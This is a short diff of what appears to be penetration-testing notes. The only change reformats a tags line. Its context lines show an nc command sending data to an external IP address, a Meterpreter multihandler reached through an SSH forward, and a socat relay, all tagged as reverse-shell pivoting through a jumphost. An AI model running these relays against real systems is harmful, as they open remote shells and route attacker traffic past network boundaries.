@@ -64,4 +64,4 @@ echo "remote c" | nc 178.254.30.161 80
 spawn multihandler 4444 ->  connect multihandlet 2 ssh port 127.0.0.1:5555
 user@Local$ socat -d -d  TCP:localhost:4444 TCP:localhost:5555
 
-tags: [reverse shell] meterpreter jumphost ssh
+tags: #reverse_shell #meterpreter #jumphost #ssh 
